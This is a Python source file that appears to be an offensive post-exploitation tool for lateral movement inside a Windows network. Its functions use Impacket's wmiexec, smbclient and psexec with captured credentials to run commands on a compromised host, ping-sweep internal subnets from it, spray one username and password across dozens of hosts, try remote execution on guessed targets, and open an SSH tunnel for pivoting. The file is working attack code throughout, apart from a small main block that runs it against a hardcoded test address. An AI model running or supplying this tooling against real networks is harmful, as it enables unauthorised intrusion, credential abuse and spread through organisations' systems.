#!/usr/bin/env python3

import subprocess
import json
import os
import re
import ipaddress
from datetime import datetime

def run_command(command, timeout=120):
    """Run a system command and return results"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def discover_network_segments(target_ip, username, password):
    """Discover additional network segments from compromised host"""
    print(f"[*] Discovering network segments from {target_ip}")
    
    results = {}
    
    # Get routing table
    route_print = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'route print'")
    results['routing_table'] = route_print
    
    # Get ARP table
    arp_table = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'arp -a'")
    results['arp_table'] = arp_table
    
    # Get network adapters
    ip_config = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'ipconfig /all'")
    results['network_adapters'] = ip_config
    
    return results

def scan_from_compromised_host(target_ip, username, password, network_segments):
    """Perform network scanning from the compromised host"""
    print(f"[*] Scanning networks from compromised host {target_ip}")
    
    results = {}
    
    for segment in network_segments:
        print(f"  Scanning network: {segment}")
        
        # Use compromised host to scan other networks
        scan_cmd = f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'for /l %i in (1,1,254) do @ping -n 1 -w 100 {segment}.%i | find \"Reply\"'"
        scan_result = run_command(scan_cmd)
        results[segment] = scan_result
        
        if scan_result['success'] and 'Reply' in scan_result['output']:
            print(f"    Found live hosts in {segment}")
    
    return results

def attempt_smb_lateral_move(source_ip, target_ip, username, password):
    """Attempt lateral movement via SMB to other hosts"""
    print(f"[*] Attempting SMB lateral movement to {target_ip}")
    
    results = {}
    
    # Try SMB connection with same credentials
    smb_connect = run_command(f"python3 /usr/share/doc/python3-impacket/examples/smbclient.py '{username}:{password}@{target_ip}' -c 'ls'")
    results['smb_connection'] = smb_connect
    
    # Try WMI execution on target
    wmi_exec = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'whoami'")
    results['wmi_execution'] = wmi_exec
    
    # Try psexec
    psexec = run_command(f"python3 /usr/share/doc/python3-impacket/examples/psexec.py '{username}:{password}@{target_ip}' -c 'whoami'")
    results['psexec'] = psexec
    
    return results

def password_spray_across_network(credentials, network_range):
    """Spray credentials across the network"""
    print(f"[*] Password spraying across {network_range}")
    
    results = {}
    username, password = credentials.split(':', 1)
    
    # Generate IP list for the network
    try:
        network = ipaddress.ip_network(network_range, strict=False)
        target_ips = [str(ip) for ip in network.hosts()][:50]  # Limit to first 50 hosts
    except:
        target_ips = [f"{network_range}.{i}" for i in range(1, 50)]
    
    for target_ip in target_ips:
        print(f"  Spraying {target_ip}...")
        
        # Try SMB connection
        smb_result = run_command(f"python3 /usr/share/doc/python3-impacket/examples/smbclient.py '{username}:{password}@{target_ip}' -c 'ls' 2>/dev/null")
        
        if smb_result['success']:
            results[target_ip] = {
                'smb_success': True,
                'output': smb_result['output']
            }
            print(f"    ✅ Successful SMB connection to {target_ip}")
        else:
            results[target_ip] = {
                'smb_success': False,
                'error': smb_result['error']
            }
    
    return results

def setup_pivot_listener(compromised_ip, username, password, local_port, remote_port):
    """Set up pivot listener on compromised host"""
    print(f"[*] Setting up pivot listener on {compromised_ip}")
    
    results = {}
    
    # Try to create SSH tunnel (if SSH is available)
    ssh_tunnel = run_command(f"ssh -f -N -L {local_port}:localhost:{remote_port} {username}@{compromised_ip}")
    results['ssh_tunnel'] = ssh_tunnel
    
    # Alternative: use impacket for port forwarding
    if not ssh_tunnel['success']:
        print("  SSH not available, trying other methods...")
        # Additional pivot methods can be added here
    
    return results

def run_lateral_movement(compromised_ip, credentials, current_network):
    """Main function for lateral movement activities"""
    print(f"\n{'='*60}")
    print(f"LATERAL MOVEMENT MODULE - Compromised: {compromised_ip}")
    print(f"{'='*60}")
    
    results = {
        'compromised_host': compromised_ip,
        'timestamp': datetime.now().isoformat(),
        'credentials_used': credentials,
        'lateral_movement': {}
    }
    
    # Extract username and password
    username, password = credentials.split(':', 1)
    
    # Step 1: Discover network segments
    results['lateral_movement']['network_discovery'] = discover_network_segments(compromised_ip, username, password)
    
    # Step 2: Identify potential target networks (simplified)
    network_segments = [
        '192.168.1',  # Common internal networks
        '192.168.0',
        '10.0.0',
        '10.0.1',
        '172.16.0',
        '172.16.1'
    ]
    
    # Step 3: Scan from compromised host
    results['lateral_movement']['network_scanning'] = scan_from_compromised_host(compromised_ip, username, password, network_segments)
    
    # Step 4: Password spray across network
    results['lateral_movement']['password_spray'] = password_spray_across_network(credentials, current_network)
    
    # Step 5: Attempt lateral movement to specific targets
    lateral_move_results = {}
    potential_targets = []  # Would be populated from scan results
    
    # Add some example targets based on common network patterns
    example_targets = [
        f"{current_network}.1",  # Gateway
        f"{current_network}.2",  # Common server
        f"{current_network}.100",  # Common static IP
        f"{current_network}.200"   # Another common static IP
    ]
    
    for target in example_targets:
        lateral_move_results[target] = attempt_smb_lateral_move(compromised_ip, target, username, password)
    
    results['lateral_movement']['lateral_attempts'] = lateral_move_results
    
    # Save results
    os.makedirs('results/lateral_movement', exist_ok=True)
    filename = f"results/lateral_movement/lateral_{compromised_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Lateral movement results saved to {filename}")
    
    # Print summary
    print(f"\n{'='*40}")
    print("LATERAL MOVEMENT SUMMARY")
    print(f"{'='*40}")
    
    successful_moves = 0
    for target, attempt in lateral_move_results.items():
        if any(result.get('success', False) for result in attempt.values()):
            successful_moves += 1
            print(f"✅ Successful lateral movement to {target}")
    
    if successful_moves == 0:
        print("❌ No successful lateral movement")
    else:
        print(f"✅ Total successful lateral movements: {successful_moves}")
    
    return results

if __name__ == "__main__":
    # Test the module structure
    target = "10.0.3.20"
    test_creds = "administrator:password123"
    current_net = "10.0.3"
    results = run_lateral_movement(target, test_creds, current_net)
    print(f"\nLateral movement simulation completed.")
